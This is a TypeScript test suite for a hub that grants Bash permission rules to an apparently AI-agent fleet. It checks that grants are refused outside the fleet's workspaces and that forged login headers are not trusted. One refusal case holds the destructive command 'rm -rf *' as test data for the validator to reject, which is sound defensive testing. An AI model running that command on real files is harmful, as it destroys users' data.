      expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: [RULE] } });
      expect(grants().map((g) => g["file"])).toEqual([settings]);
    });

    test("the registered process runs elsewhere: refused, saying what was checked", async () => {
      const elsewhere = join(base, "elsewhere");
      mkdirSync(elsewhere);
      const pid = registeredIn(elsewhere);
      await start();
      const got = await post(allow);
      expect([got.status, asString(got.body["error"])]).toEqual([
        409,
        `This permission's folder ${session} isn't part of this fleet's work, so it can't be granted here; ask the coordinator to record it again from its session. ` +
          `(Checked: it is no session root of this fleet (no heartbeat names it, and the fleet's registered session ${pid} runs in ${elsewhere}), ` +
          `no workspace in the ledger, and no jj workspace of ${elsewhere}.)`,
      ]);
      expect([existsSync(settings), grants(), readChat(root)]).toEqual([false, [], []]);
    });

    test("a folder beside the session, or under the fleet, that is no workspace of this fleet's work: refused in plain words", async () => {
      const pid = registeredIn(session);
      const sibling = join(base, "repo-ws-a1");
      const underFleet = join(root, "ws", "a1");
      await start();

      for (const ws of [sibling, underFleet]) {
        mkdirSync(join(ws, ".claude"), { recursive: true });
        withRows(permission({ refusal: { tool: "Bash", call: CALL, rule: RULE, cause: "c", root: ws, agent_id: "agent-7f" } }));
        const got = await post(allow);
        expect([got.status, asString(got.body["error"])]).toEqual([
          409,
          `This permission's folder ${ws} isn't part of this fleet's work, so it can't be granted here; ask the coordinator to record it again from its session. ` +
            `(Checked: it is no session root of this fleet (no heartbeat names it, and the fleet's registered session ${pid} runs in ${session}), ` +
            `no workspace in the ledger, and no jj workspace of ${session}.)`,
        ]);
        expect(existsSync(join(ws, ".claude", "settings.local.json"))).toBe(false);
      }

      expect([existsSync(settings), grants(), readChat(root)]).toEqual([false, [], []]);
    });

    test("a worker's workspace the ledger lists is granted at the session root, where the subagent's session reads its permissions", async () => {
      registeredIn(session);
      const ws = join(base, "repo-b155");
      mkdirSync(join(ws, ".claude"), { recursive: true });
      const row = permission({ agent: "b196", refusal: { tool: "Bash", call: CALL, rule: RULE, cause: "c", root: ws, agent_id: null } });
      withWorkspaces([{ id: "b155", agent: "b196", path: ws, repo: session, status: "active" }], row);
      await start();
      const got = await post({ ...allow, root: ws });
      expect(got.status).toBe(201);
      expect(asString(got.body["grant"])).toBe(
        `This permission names b155's workspace ${ws}; the hub granted it at the session root ${session}, where b196's session reads its permissions.`,
      );
      expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: [RULE] } });
      expect(existsSync(join(ws, ".claude", "settings.local.json"))).toBe(false);
      const [grant] = grants();
      expect([grant?.["file"], grant?.["workspace"], grant?.["agent_id"]]).toEqual([settings, ws, null]);
      expect(readChat(root).map((m) => m.stored["decision"])).toEqual(["p-1a2b3c4d"]);
    });

    test("a jj workspace of the session's repo that the ledger does not list is granted at the session root, found through jj", async () => {
      const repo = join(base, "jjrepo");
      const ws = join(base, "jjrepo-b2");
      expect(Bun.spawnSync(["jj", "git", "init", repo], { stdout: "ignore", stderr: "ignore" }).exitCode).toBe(0);
      expect(Bun.spawnSync(["jj", "-R", repo, "workspace", "add", "--name", "b2", ws], { stdout: "ignore", stderr: "ignore" }).exitCode).toBe(0);
      registeredIn(repo);
      withRows(permission({ refusal: { tool: "Bash", call: CALL, rule: RULE, cause: "c", root: ws, agent_id: "agent-7f" } }));
      await start();
      const got = await post({ ...allow, root: ws });
      expect([got.status, asString(got.body["grant"])]).toEqual([
        201,
        `This permission names b2's workspace ${ws}; the hub granted it at the session root ${repo}, where the worker's session reads its permissions.`,
      ]);
      const file = join(repo, ".claude", "settings.local.json");
      expect(JSON.parse(readFileSync(file, "utf8"))).toEqual({ permissions: { allow: [RULE] } });
      expect(existsSync(join(ws, ".claude"))).toBe(false);
      expect([grants()[0]?.["file"], grants()[0]?.["workspace"], grants()[0]?.["reload"]]).toEqual([file, ws, "restart"]);
    });

    test("a registered pid that has died names no session: refused", async () => {
      const dead = Bun.spawn(["true"], { cwd: session });
      await dead.exited;
      expect(registeredSession(dead.pid)).toBeUndefined();
      expect(registeredSession(process.pid)).toEqual({ pid: process.pid, cwd: process.cwd() });
      const answered = { dir: root, decision: "p-1a2b3c4d", text: allow.text, rule: RULE, rules: undefined, runs: undefined, root: session, by: "local", at: "2026-01-01T00:00:00+00:00", home: undefined };
      expect(registeredSession(1)).toBeUndefined();
      expect(await grantAnswer({ ...answered, registered: () => registeredSession(dead.pid) })).toEqual({
        refused:
          `This permission's folder ${session} isn't part of this fleet's work, so it can't be granted here; ask the coordinator to record it again from its session. ` +
          "(Checked: it is no session root of this fleet (no heartbeat names it, and no live session is registered for this fleet), no workspace in the ledger, and no jj workspace of a session root.)",
      });
      expect([existsSync(settings), grants()]).toEqual([false, []]);
    });
  });

  test("a workspace with several session roots (two heartbeats, and the test's own registered process) and none of them its repo's: refused, naming them", async () => {
    const other = join(base, "other");
    mkdirSync(other);
    writeFileSync(join(root, "heartbeats", "s2.json"), JSON.stringify({ session: "s2", at: "2026-01-01T00:00:00+00:00", cwd: other, project: other }));
    const ws = join(base, "third-b1");
    mkdirSync(ws);
    withWorkspaces([{ id: "b1", agent: "a1", path: ws, repo: join(base, "third"), status: "active" }], permission({ refusal: { tool: "Bash", call: CALL, rule: RULE, cause: "c", root: ws, agent_id: "agent-7f" } }));
    await start();
    const got = await post(allow);
    expect([got.status, asString(got.body["error"])]).toEqual([
      409,
      `This permission names b1's workspace ${ws}, and none of this fleet's session roots (${[other, session, process.cwd()].sort().join(", ")}) is the one its session reads its permissions from, ` +
        "so it can't be granted here; ask the coordinator to record it again with --root set to that session's root.",
    ]);
    expect([existsSync(settings), existsSync(join(other, ".claude")), grants(), readChat(root)]).toEqual([false, false, [], []]);
  });

  test("a root a heartbeat names is granted there as before, with no note", async () => {
    await start();
    const got = await post(allow);
    expect([got.status, got.body["grant"], grants()[0]?.["file"], Object.keys(grants()[0] ?? {}).includes("workspace")]).toEqual([201, undefined, settings, false]);
  });

  test("deny is stored as any answer, and grants nothing", async () => {
    await start();
    expect((await post({ text: "deny: Deny\nnot on main", decision: "p-1a2b3c4d" })).status).toBe(201);
    expect([existsSync(settings), grants()]).toEqual([false, []]);
  });

  test("a row the hub cannot trust, or settings it cannot read, refuse with the reason and store nothing", async () => {
    const elsewhere = join(base, "elsewhere");
    mkdirSync(elsewhere);
    const refusal = (over: JsonObject): JsonObject => permission({ refusal: { tool: "Bash", call: CALL, rule: RULE, cause: "c", root: session, agent_id: null, ...over } });

    const cases: (readonly [string, JsonObject])[] = [
      ["isn't part of this fleet's work", refusal({ root: elsewhere })],
      ["doesn't exist", refusal({ root: join(base, "missing") })],
      ["absolute", refusal({ root: "repo" })],
      ["rule", refusal({ rule: "Bash(git push:*)" })],
      ["*", refusal({ call: "rm -rf *", rule: "Bash(rm -rf *)" })],
      ["Bash", refusal({ tool: "Edit", rule: `Edit(${CALL})` })],
      ["refused call", permission({ refusal: null })],
    ];

    await start();

    for (const [word, row] of cases) {
      withRows(row);
      const got = await post(allow);
      expect([got.status, asString(got.body["error"])?.includes(word)]).toEqual([409, true]);
    }

    withRows(permission());
    expect((await post({ ...allow, quote: 5 })).status).toBe(400);
    expect(existsSync(settings)).toBe(false);
    writeFileSync(settings, "{ not json");
    const bad = await post(allow);
    expect([bad.status, asString(bad.body["error"])?.includes("settings.local.json")]).toEqual([409, true]);
    expect(readFileSync(settings, "utf8")).toBe("{ not json");
    expect([readChat(root), grants(), existsSync(join(elsewhere, ".claude"))]).toEqual([[], [], false]);
  });

  test("a login claimed in a header on this machine is only this machine's word: the grant says local", async () => {
    const fake = join(base, "tailscale");
    writeFileSync(fake, FAKE_TAILSCALE);
    chmodSync(fake, 0o755);
    await start({ tailscale: fake });
    expect((await post(allow, { "Tailscale-User-Login": OWNER })).status).toBe(201);
    expect(grants()[0]?.["by"]).toBe("local");
  });
});

test("a grant names the tailnet login Tailscale gives a peer, and this machine's own address as local", async () => {
  const header = (): string | null => null;
  const whois = (ip: string): Promise<string | undefined> => Promise.resolve(ip === "100.101.1.2" ? OWNER : undefined);
  const peer = await viewerOf("100.101.1.2", header, OWNER, whois, "100.69.1.1");
  const self = await viewerOf("100.69.1.1", header, OWNER, whois, "100.69.1.1");
  const forged = await viewerOf("127.0.0.1", (name) => (name === "Tailscale-User-Login" ? OWNER : null), OWNER, whois, "100.69.1.1");
  expect([grantor(peer), grantor(self), grantor(forged)]).toEqual([`tailnet:${OWNER}`, "local", "local"]);
});
